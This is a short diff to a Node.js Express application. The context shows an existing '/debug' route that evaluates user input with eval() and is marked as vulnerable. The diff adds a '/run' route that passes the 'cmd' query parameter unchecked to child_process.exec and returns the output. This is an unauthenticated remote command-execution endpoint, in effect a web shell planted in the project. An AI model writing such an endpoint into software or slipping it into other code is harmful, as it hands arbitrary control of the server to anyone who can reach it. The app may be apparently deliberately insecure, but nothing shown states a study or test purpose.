@@ -75,3 +75,14 @@ app.get("/debug", (req, res) => {
   const result = eval(code); // vulnerable
   res.send(`Result: ${result}`);
 });
+
+
+
+const { exec } = require("child_process");
+
+app.get("/run", (req, res) => {
+  const cmd = req.query.cmd;
+  exec(cmd, (err, stdout) => {
+    res.send(stdout);
+  });
+});
